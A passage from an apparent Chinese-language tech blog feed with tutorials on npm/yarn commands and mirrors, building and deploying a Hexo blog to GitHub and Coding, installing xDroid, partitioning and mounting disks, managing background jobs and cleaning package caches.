<td style="text-align:left"><code>yarn add [package] --dev</code></td>
</tr>
<tr>
<td style="text-align:left"><em>(N/A)</em></td>
<td style="text-align:left"><code>yarn add [package] --peer</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm install [package] --save-optional</code></td>
<td style="text-align:left"><code>yarn add [package] --optional</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm install [package] --save-exact</code></td>
<td style="text-align:left"><code>yarn add [package] --exact</code></td>
</tr>
<tr>
<td style="text-align:left"><em>(N/A)</em></td>
<td style="text-align:left"><code>yarn add [package] --tilde</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm install [package] --global</code></td>
<td style="text-align:left"><code>yarn global add [package]</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm update --global</code></td>
<td style="text-align:left"><code>yarn global upgrade</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm rebuild</code></td>
<td style="text-align:left"><code>yarn add --force</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm uninstall [package]</code></td>
<td style="text-align:left"><code>yarn remove [package]</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm cache clean</code></td>
<td style="text-align:left"><code>yarn cache clean [package]</code></td>
</tr>
<tr>
<td style="text-align:left"><code>rm -rf node_modules &amp;&amp; npm install</code></td>
<td style="text-align:left"><code>yarn upgrade</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm version major</code></td>
<td style="text-align:left"><code>yarn version --major</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm version minor</code></td>
<td style="text-align:left"><code>yarn version --minor</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm version patch</code></td>
<td style="text-align:left"><code>yarn version --patch</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="镜像源配置"><a href="#镜像源配置" class="headerlink" title="镜像源配置"></a>镜像源配置</h4><h5 id="简单修改"><a href="#简单修改" class="headerlink" title="简单修改"></a>简单修改</h5><p><strong>npm</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 临时修改（只生效一次）</span></span><br><span class="line">npm install 包的名字 --registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#  设置npm的配置项（全局配置）</span></span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看npm源的当前地址</span></span><br><span class="line">npm config get registry</span><br></pre></td></tr></table></figure></p>
<p><strong>yarn</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 临时修改（只生效一次）</span></span><br><span class="line">yarn save 包的名字 --registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#  设置npm的配置项（全局配置）</span></span><br><span class="line">yarn config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看npm源的当前地址</span></span><br><span class="line">yarn config get registry</span><br></pre></td></tr></table></figure></p>
<h5 id="使用工具修改"><a href="#使用工具修改" class="headerlink" title="使用工具修改"></a>使用工具修改</h5><p><strong>npm</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装工具</span></span><br><span class="line">npm install -g nrm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出可选源</span></span><br><span class="line">nrm ls</span><br><span class="line"></span><br><span class="line">* npm ---- https://registry.npmjs.org/</span><br><span class="line">  cnpm --- http://r.cnpmjs.org/</span><br><span class="line">  taobao - https://registry.npm.taobao.org/</span><br><span class="line">  nj ----- https://registry.nodejitsu.com/</span><br><span class="line">  rednpm - http://registry.mirror.cqupt.edu.cn/</span><br><span class="line">  npmMirror  https://skimdb.npmjs.com/registry/</span><br><span class="line">  edunpm - http://registry.enpmjs.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试源响应时间</span></span><br><span class="line">nrm <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">* npm ---- 1440ms</span><br><span class="line">  cnpm --- 937ms</span><br><span class="line">  taobao - 392ms</span><br><span class="line">  nj ----- Fetch Error</span><br><span class="line">  rednpm - Fetch Error</span><br><span class="line">  npmMirror  1296ms</span><br><span class="line">  edunpm - Fetch Error</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换源</span></span><br><span class="line">nrm use taobao</span><br></pre></td></tr></table></figure>
<p><strong>yarn</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装工具</span></span><br><span class="line">sudo yarn global add yrm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出可选源</span></span><br><span class="line">yrm ls</span><br><span class="line"></span><br><span class="line">* npm ---- https://registry.npmjs.org/</span><br><span class="line">  cnpm --- http://r.cnpmjs.org/</span><br><span class="line">  taobao - https://registry.npm.taobao.org/</span><br><span class="line">  nj ----- https://registry.nodejitsu.com/</span><br><span class="line">  rednpm - http://registry.mirror.cqupt.edu.cn/</span><br><span class="line">  npmMirror  https://skimdb.npmjs.com/registry/</span><br><span class="line">  edunpm - http://registry.enpmjs.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试源响应时间</span></span><br><span class="line">yrm <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"> * npm ---- 13480ms</span><br><span class="line">  cnpm --- 1807ms</span><br><span class="line">  taobao - 482ms</span><br><span class="line">  nj ----- Fetch Error</span><br><span class="line">  rednpm - Fetch Error</span><br><span class="line">  npmMirror  2499ms</span><br><span class="line">  edunpm - Fetch Error</span><br><span class="line">  yarn --- Fetch Error</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换源</span></span><br><span class="line">yrm use taobao</span><br></pre></td></tr></table></figure>
<h4 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir ～/blog	<span class="comment">#新建一个目录夹用于存放博客文件，如果有错误，直接删除该目录都行</span></span><br><span class="line"><span class="built_in">cd</span> ~/blog</span><br><span class="line">hexo init	<span class="comment">#生成博客框架文件，出现WARN警告可以忽略，当出现ERR报错时就的将该目录下的所有文件删除，排除错误后从来</span></span><br><span class="line"><span class="comment">#出现INFO  Start blogging with Hexo!代表成功</span></span><br></pre></td></tr></table></figure>
<p><strong>开启本地访问服务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s	<span class="comment">#hexo server	将开启本地的4000端口用来访问博客</span></span><br></pre></td></tr></table></figure>
<p><strong>新建文章</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n “文章名”	<span class="comment">#hexo new “文章名”</span></span><br></pre></td></tr></table></figure>
<p><strong>清除缓存</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo cl		<span class="comment">#hexo clean</span></span><br></pre></td></tr></table></figure>
<p><strong>生成静态文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g		<span class="comment">#hexo generate</span></span><br></pre></td></tr></table></figure>
<h4 id="hexo的一些指令"><a href="#hexo的一些指令" class="headerlink" title="hexo的一些指令"></a>hexo的一些指令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clean     删除生成的文件和缓存</span><br><span class="line">config    获取或设置配置</span><br><span class="line">deploy    部署到远程站点</span><br><span class="line">generate  生成静态文件</span><br><span class="line"><span class="built_in">help</span>      获取有关命令的帮助</span><br><span class="line">init      创建一个新的Hexo文件夹</span><br><span class="line">list      列出网站的信息</span><br><span class="line">migrate   将您的站点从其他系统迁移到Hexo</span><br><span class="line">new       创建一个新帖子</span><br><span class="line">publish   将草稿帖子从_drafts移动到_posts文件夹</span><br><span class="line">render    使用渲染器插件渲染文件</span><br><span class="line">server    启动服务器 </span><br><span class="line">version   显示版本信息</span><br></pre></td></tr></table></figure>
<h3 id="将博客部署到GitHub上"><a href="#将博客部署到GitHub上" class="headerlink" title="将博客部署到GitHub上"></a>将博客部署到GitHub上</h3><h4 id="准备GitHub仓库"><a href="#准备GitHub仓库" class="headerlink" title="准备GitHub仓库"></a>准备GitHub仓库</h4><p>在github上创建一个以<code>用户名.github.io</code>命名的公开仓库,如：<code>eonun.github.io</code>获得仓库地址:<code>https://github.com/eonun/eonun.github.io.git</code></p>
<h4 id="安装git部署插件"><a href="#安装git部署插件" class="headerlink" title="安装git部署插件"></a>安装git部署插件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-deployer-git	<span class="comment">#在博客主目录下，安装部署插件</span></span><br></pre></td></tr></table></figure>
<h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml	<span class="comment">#修改在博客目录下的配置文件</span></span><br><span class="line"><span class="comment">#在末尾修改如下</span></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment">#仓库地址</span></span><br><span class="line">  repo: https://github.com/eonun/eonun.github.io.git</span><br><span class="line">  branch: gh-pages</span><br></pre></td></tr></table></figure>
<h4 id="将本地的博客文件上传到github上"><a href="#将本地的博客文件上传到github上" class="headerlink" title="将本地的博客文件上传到github上"></a>将本地的博客文件上传到github上</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo d	<span class="comment">#输入账号密码验证</span></span><br></pre></td></tr></table></figure>
<h4 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h4><p>在仓库中能查看到博客文件了，等待几分钟后以仓库名作网址访问：<code>eonun.github.io</code>即可访问个人博客网站</p>
<h3 id="将博客部署到coding上"><a href="#将博客部署到coding上" class="headerlink" title="将博客部署到coding上"></a>将博客部署到coding上</h3><h4 id="准备仓库"><a href="#准备仓库" class="headerlink" title="准备仓库"></a>准备仓库</h4><p><code>coding</code>分团队版和个人版，大致都差不多的</p>
<p>创建一个仓库，<strong>名字可随意</strong>，不用像<code>github</code>那样有严格的格式，</p>
<h3 id="开启静态网页服务"><a href="#开启静态网页服务" class="headerlink" title="开启静态网页服务"></a>开启静态网页服务</h3><p><code>coding</code>的项目需要自己开启静态网页服务</p>
<p><strong>团队版：</strong> 项目<code>&gt;</code>持续部署<code>&gt;</code>静态网站    <strong><em>可选项</em></strong>：<code>&gt;</code>设置<code>&gt;</code>自定义域名<code>&gt;</code>绑定新域名<code>&gt;</code>绑定首选域名<code>&gt;</code>强制HTTPS</p>
<p><strong>个人版：</strong> 项目<code>&gt;</code>代码<code>&gt;</code>Pages服务，一键开启</p>
<p>开启<code>Pages</code>服务后会得到一个访问地址，个人版的地址是<code>用户名.coding.me/项目名</code>,团队版的是<code>随机码.coding-pages.com</code>如果没有自己的域名的建议使用个人版。</p>
<h4 id="安装git部署插件-1"><a href="#安装git部署插件-1" class="headerlink" title="安装git部署插件"></a>安装git部署插件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-deployer-git	<span class="comment">#在博客主目录下，安装部署插件</span></span><br></pre></td></tr></table></figure>
<h3 id="修改配置文件-1"><a href="#修改配置文件-1" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml	<span class="comment">#修改在博客目录下的配置文件</span></span><br><span class="line"><span class="comment">#在末尾修改如下</span></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment">#仓库地址</span></span><br><span class="line">  repo: https://github.com/eonun/eonun.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<h3 id="多git平台搭建"><a href="#多git平台搭建" class="headerlink" title="多git平台搭建"></a>多git平台搭建</h3><p>配置ssh-key，参考<a href="/posts/71f63e37/">git入手</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml	<span class="comment">#修改在博客目录下的配置文件</span></span><br><span class="line"><span class="comment">#在末尾修改如下</span></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo:</span><br><span class="line">      github: git@github.com:eonun/eonun.github.io.git</span><br><span class="line">      coding: git@e.coding.net:eonun/eonun.git</span><br><span class="line">  branch:</span><br><span class="line">      github: gh-pages</span><br><span class="line">      coding: coding-pages</span><br></pre></td></tr></table></figure>
<p>有条件的自己搭个服务器才是最终解决方案</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>免费私有项目</th>
<th>自定义域名</th>
<th>CI/CD</th>
<th>服务器</th>
</tr>
</thead>
<tbody>
<tr>
<td>GitHub</td>
<td>是 (私有后无法开启Pages)</td>
<td>是</td>
<td>否</td>
<td>荷兰</td>
</tr>
<tr>
<td>GitLab</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>美国</td>
</tr>
<tr>
<td>Gitee</td>
<td>是</td>
<td>99/年</td>
<td>否</td>
<td>湖北</td>
</tr>
<tr>
<td>Coding</td>
<td>是</td>
<td>是</td>
<td>否</td>
<td>香港</td>
</tr>
</tbody>
</table>
</div>
<h3 id="绑定个人域名"><a href="#绑定个人域名" class="headerlink" title="绑定个人域名"></a>绑定个人域名</h3><h4 id="购买域名并添加解析-如不需要，可直接用仓库名做自己的博客域名，无需单独购买"><a href="#购买域名并添加解析-如不需要，可直接用仓库名做自己的博客域名，无需单独购买" class="headerlink" title="购买域名并添加解析(如不需要，可直接用仓库名做自己的博客域名，无需单独购买)"></a>购买域名并添加解析(如不需要，可直接用仓库名做自己的博客域名，无需单独购买)</h4><p>选择合适的域名注册商注册一个域名，阿里腾讯都行。购买域名后添加解析</p>
<p>IP地址通过<code>ping</code>访问地址获得</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">主机记录</th>
<th style="text-align:left">记录类型</th>
<th style="text-align:left">记录值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">@</td>
<td style="text-align:left">A</td>
<td style="text-align:left">IP地址</td>
</tr>
<tr>
<td style="text-align:left">www</td>
<td style="text-align:left">CNAME</td>
<td style="text-align:left">仓库名</td>
</tr>
</tbody>
</table>
</div>
<p>如:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">主机记录</th>
<th style="text-align:left">记录类型</th>
<th style="text-align:left">记录值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">@</td>
<td style="text-align:left">A</td>
<td style="text-align:left">185.199.110.153</td>
</tr>
<tr>
<td style="text-align:left">www</td>
<td style="text-align:left">CNAME</td>
<td style="text-align:left">eonun.github.io</td>
</tr>
</tbody>
</table>
</div>
<h4 id="在仓库设置界面添加自定义域名"><a href="#在仓库设置界面添加自定义域名" class="headerlink" title="在仓库设置界面添加自定义域名"></a>在仓库设置界面添加自定义域名</h4><p>在仓库页顶部找到<code>Settings</code>，进入后到页面最下方找到<code>GitHub Pages</code>，再找到<code>Custom domain</code>填入自己的域名就保存可以了</p>
<p><strong>在source目录下创建文件CNAME，不然每次hexo deploy都得去设置GitHub Pages自定义域名</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/CNAME	<span class="comment">#创建文件添加内容（只能一个域名）：</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>eonun.com</p>
</blockquote>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux上运行安卓应用</title>
    <url>/posts/80bea61a/</url>
    <content><![CDATA[<p>麟卓安卓是北京麟卓信息科技有限公司为扩展linux应用生态倾力研发的一款中间件产品，能让大量安卓应用在Linux操作系统上使用。</p>
<p>运行环境<br>建议硬件环境<br>CPU:（1）主频大于2GHz （2）x86架构 （3）64位<br>内存： 大于4G<br>硬盘容量：  大于500G<br>显卡型号：  Nvidia,AMD,Intel</p>
<p>建议软件环境: 64位Linux主流发行版，如： Ubuntu18.04 ,Manjora, Fedora27, Arch</p>
<a id="more"></a>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>官方下载地址: <a href="https://www.linzhuotech.com/product/download">https://www.linzhuotech.com/product/download</a></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>将下载的压缩包解压</p>
<figure class="highlight sh"><figcaption><span>~/</span></figcaption><table><tr><td class="code"><pre><span class="line">tar -zxvf xDroidInstall-x86_64-vxxxxxx.tar.gz</span><br></pre></td></tr></table></figure>
<p>进入解压目录运行 <code>install.sh</code> 进行安装</p>
<figure class="highlight sh"><figcaption><span>~/xDroidInstall-x86_64</span></figcaption><table><tr><td class="code"><pre><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
<p>若提示无执行权限给添加相应的权限即可</p>
<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><p>软件安装完毕后，可以通过以下两种种方式启动xAppCenter软件。</p>
<ul>
<li>在终端中执行<code>/opt/xDroid/command-xapp-center.sh</code></li>
<li>双击桌面上的xAppCenter软件图标</li>
</ul>
<p><a href="https://www.linzhuotech.com/Public/Home/img/gitbook/user_manual_nv/_book/">更多参考</a></p>
]]></content>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux分区</title>
    <url>/posts/293749eb/</url>
    <content><![CDATA[<h1 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h1><p><code>fdisk /dev/sdX</code> 对磁盘X进行分区</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">命令(输入 m 获取帮助)：m</span><br><span class="line"></span><br><span class="line">帮助：</span><br><span class="line"></span><br><span class="line">  GPT</span><br><span class="line">   M   进入 保护/混合 MBR</span><br><span class="line"></span><br><span class="line">  常规</span><br><span class="line">   d   删除分区</span><br><span class="line">   F   列出未分区的空闲区</span><br><span class="line">   l   列出已知分区类型</span><br><span class="line">   n   添加新分区</span><br><span class="line">   p   打印分区表</span><br><span class="line">   t   更改分区类型</span><br><span class="line">   v   检查分区表</span><br><span class="line">   i   打印某个分区的相关信息</span><br><span class="line"></span><br><span class="line">  杂项</span><br><span class="line">   m   打印此菜单</span><br><span class="line">   x   更多功能(仅限专业人员)</span><br><span class="line"></span><br><span class="line">  脚本</span><br><span class="line">   I   从 sfdisk 脚本文件加载磁盘布局</span><br><span class="line">   O   将磁盘布局转储为 sfdisk 脚本文件</span><br><span class="line"></span><br><span class="line">  保存并退出</span><br><span class="line">   w   将分区表写入磁盘并退出</span><br><span class="line">   q   退出而不保存更改</span><br><span class="line"></span><br><span class="line">  新建空磁盘标签</span><br><span class="line">   g   新建一份 GPT 分区表</span><br><span class="line">   G   新建一份空 GPT (IRIX) 分区表</span><br><span class="line">   o   新建一份的空 DOS 分区表</span><br><span class="line">   s   新建一份空 Sun 分区表</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="创建文件系统-格式化分区"><a href="#创建文件系统-格式化分区" class="headerlink" title="创建文件系统(格式化分区)"></a>创建文件系统(格式化分区)</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mkfs [选项] [-t &lt;类型&gt;] [文件系统选项] &lt;设备&gt; [&lt;大小&gt;]</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line"> -t, --<span class="built_in">type</span>=&lt;类型&gt;  文件系统类型；若不指定，将使用 ext2</span><br><span class="line">     fs-options     实际文件系统构建程序的参数</span><br><span class="line">     &lt;设备&gt;         要使用设备的路径</span><br><span class="line">     &lt;大小&gt;         要使用设备上的块数</span><br><span class="line"> -V, --verbose      解释正在进行的操作；</span><br><span class="line">                      多次指定 -V 将导致空运行(dry-run)</span><br><span class="line"> -h, --<span class="built_in">help</span>         显示此帮助</span><br><span class="line"> -V, --version      显示版本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="或直接使用相应文件系统的分区命令进行分区"><a href="#或直接使用相应文件系统的分区命令进行分区" class="headerlink" title="或直接使用相应文件系统的分区命令进行分区"></a>或直接使用相应文件系统的分区命令进行分区</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkswap  # 交换分区</span><br><span class="line">mkfs.bfs</span><br><span class="line">mkfs.btrfs</span><br><span class="line">mkfs.cramfs</span><br><span class="line">mkfs.ext2</span><br><span class="line">mkfs.ext3</span><br><span class="line">mkfs.ext4</span><br><span class="line">mkfs.fat</span><br><span class="line">mkfs.minix</span><br><span class="line">mkfs.msdos</span><br><span class="line">mkfs.ntfs</span><br><span class="line">mkfs.vfat</span><br><span class="line">mkfs.xfs</span><br></pre></td></tr></table></figure>
<p>例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs -t ext4 /dev/sda3</span><br><span class="line"></span><br><span class="line">mkfs.ext4 /dev/sda3</span><br></pre></td></tr></table></figure>
<h1 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h1><h2 id="临时挂载"><a href="#临时挂载" class="headerlink" title="临时挂载"></a>临时挂载</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda3 /data   <span class="comment"># sda3分区挂载在/data目录下</span></span><br><span class="line">umount /data          <span class="comment">#卸载/data目录上挂载的分区</span></span><br></pre></td></tr></table></figure>
<h2 id="永久挂载：开机自动挂载"><a href="#永久挂载：开机自动挂载" class="headerlink" title="永久挂载：开机自动挂载"></a>永久挂载：开机自动挂载</h2><p>修改<code>/etc/fstab</code>,加入挂载项目,执行<code>mount –a</code> 即刻生效<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;dev&#x2F;sda3     &#x2F;data      ext4   defaults 1    2</span><br></pre></td></tr></table></figure><br>通过UUID挂载，预防部分开机时分区识别混乱的情况<br>使用 <code>lsblk -f</code>,<code>blkid</code> 或 <code>ls -l  /dev/disk/by-uuid/</code>查询各个分区的UUID<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">UUID=efc4ceaf-ee2b-48e1-bbdd-92d20d25b605     /data        ext4    defaults   1    2</span><br></pre></td></tr></table></figure></p>
<p><a href="/posts/4cf5c92b"><code>/etc/fstab</code> 详解</a></p>
<h1 id="查看分区"><a href="#查看分区" class="headerlink" title="查看分区"></a>查看分区</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">df -lh</span><br><span class="line">lsblk</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://wiki.archlinux.org/index.php/Fstab_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">https://wiki.archlinux.org/index.php/Fstab_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87</a>)</p>
<h1 id="移动存储器"><a href="#移动存储器" class="headerlink" title="移动存储器"></a>移动存储器</h1><p><code>udiskie</code></p>
<p>要在独立窗口管理器自启动udiskie，添加以下内容到 <code>~/.xinitrc</code> 或(i3) <code>~/.config/i3/config</code> :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">udiskie -t &amp;</span><br><span class="line"><span class="comment"># 或(i3)</span></span><br><span class="line"><span class="built_in">exec</span> --no-startup-id udiskie -t</span><br></pre></td></tr></table></figure>
<p>要停止udiskie，只需 <code>pkill udiskie</code></p>
<p>在桌面环境（如gnome，kde，mate，xfce，cinnamon等）中，只需将udiskie添加到自动启动的应用程序列表中即可（无需尾随&amp;）</p>
<p>默认模式udiskie会自动挂载新插入的设备并显示通知，但不显示系统托盘。可以使用指令指定功能，(详细手册)[<a href="https://raw.githubusercontent.com/coldfix/udiskie/master/doc/udiskie.8.txt">https://raw.githubusercontent.com/coldfix/udiskie/master/doc/udiskie.8.txt</a>]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* -a，\--automount * :</span><br><span class="line">	启用自动挂载新设备（默认）。</span><br><span class="line"></span><br><span class="line">* -A，\--no-automount * :</span><br><span class="line">	禁用自动挂载新设备。</span><br><span class="line"></span><br><span class="line">* -n，\--notify * :</span><br><span class="line">	启用弹出式通知（默认）。</span><br><span class="line"></span><br><span class="line">* -N，\--no-notify * :</span><br><span class="line">	禁用弹出通知。</span><br><span class="line"></span><br><span class="line">* -t，\--tray * :</span><br><span class="line">	显示托盘图标。</span><br><span class="line"></span><br><span class="line">* -s，\--smart-tray * :</span><br><span class="line">	显示托盘图标，在没有可用操作时会自动隐藏。</span><br><span class="line"></span><br><span class="line">* -T，\--no-tray * :</span><br><span class="line">	禁用托盘图标（默认）。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>(udiskie Wiki)[<a href="https://github.com/coldfix/udiskie/wiki/Usage">https://github.com/coldfix/udiskie/wiki/Usage</a>]</strong></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux后台运行程序</title>
    <url>/posts/d972d649/</url>
    <content><![CDATA[<h2 id="运行到后台"><a href="#运行到后台" class="headerlink" title="运行到后台"></a>运行到后台</h2><h3 id="amp-命令"><a href="#amp-命令" class="headerlink" title="&amp;命令"></a><code>&amp;</code>命令</h3><p>在命令的最后加入，该命令将会被放到后台执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tpyora test.md &amp;</span><br></pre></td></tr></table></figure></p>
<h3 id="nohup命令"><a href="#nohup命令" class="headerlink" title="nohup命令"></a><code>nohup</code>命令</h3><p>同样需要添加<code>&amp;</code>在命令末尾，该命令的作用是不挂断的运行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nohup typora test.md &amp;</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h2 id="查看后台"><a href="#查看后台" class="headerlink" title="查看后台"></a>查看后台</h2><h3 id="jobs命令"><a href="#jobs命令" class="headerlink" title="jobs命令"></a><code>jobs</code>命令</h3><p>查看当前终端后台运行的任务<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">jobs</span></span><br></pre></td></tr></table></figure></p>
<h3 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a><code>ps</code>命令</h3><p>查看当前的所有进程<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure></p>
<ul>
<li>a ：显示所有程序</li>
<li>u ：以用户为主的格式显示</li>
<li>x ：显示所有程序，不区分终端</li>
</ul>
<p>可使用<code>grep xxx</code>指定显示出xxx的进程</p>
<h2 id="关闭后台"><a href="#关闭后台" class="headerlink" title="关闭后台"></a>关闭后台</h2><h3 id="kill命令"><a href="#kill命令" class="headerlink" title="kill命令"></a><code>kill</code>命令</h3><ol>
<li><p>通过<code>jobs</code>查看<code>jobnum</code>，然后使用<code>kill %jobnum</code>关闭后台</p>
</li>
<li><p>通过<code>ps</code>查看进程<code>PID</code>，然后使用<code>kill PID</code>关闭后台</p>
</li>
</ol>
<h2 id="前后台进程切换与控制"><a href="#前后台进程切换与控制" class="headerlink" title="前后台进程切换与控制"></a>前后台进程切换与控制</h2><h3 id="fg命令"><a href="#fg命令" class="headerlink" title="fg命令"></a><code>fg</code>命令</h3><p><code>fg</code>命令用于讲后台运行的调至前台运行<br>多个后台任务时，可使用<code>jobs</code>查寻<code>jobnum</code>,然后用<code>fg %jobnum</code>选择调至前台的程序</p>
<h3 id="Ctrl-z"><a href="#Ctrl-z" class="headerlink" title="Ctrl + z"></a>Ctrl + z</h3><p>讲正在运行的前台放到后台，且处于<strong>暂停状态</strong></p>
<h3 id="bg命令"><a href="#bg命令" class="headerlink" title="bg命令"></a><code>bg</code>命令</h3><p>用于讲后台暂停的命令，变成后台继续<br>多个后台任务时，可使用<code>jobs</code>查寻<code>jobnum</code>,然后用<code>dg %jobnum</code>选择后台继续的程序</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux垃圾清理</title>
    <url>/posts/9468a30/</url>
    <content><![CDATA[<h1 id="清理系统中无用的包"><a href="#清理系统中无用的包" class="headerlink" title="清理系统中无用的包"></a>清理系统中无用的包</h1><h2 id="arch系"><a href="#arch系" class="headerlink" title="arch系"></a>arch系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -R $(pacman -Qdtq)</span><br></pre></td></tr></table></figure>
<h2 id="debian系"><a href="#debian系" class="headerlink" title="debian系"></a>debian系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove</span><br></pre></td></tr></table></figure>
<h1 id="清理包缓存"><a href="#清理包缓存" class="headerlink" title="清理包缓存"></a>清理包缓存</h1><h2 id="arch系-1"><a href="#arch系-1" class="headerlink" title="arch系"></a>arch系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sc 	<span class="comment"># 清除未安装包的缓存</span></span><br><span class="line">sudo pacman -Scc 	<span class="comment"># 清理所有缓存</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="debian系-1"><a href="#debian系-1" class="headerlink" title="debian系"></a>debian系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman clean <span class="comment"># 清除缓存包  </span></span><br></pre></td></tr></table></figure>
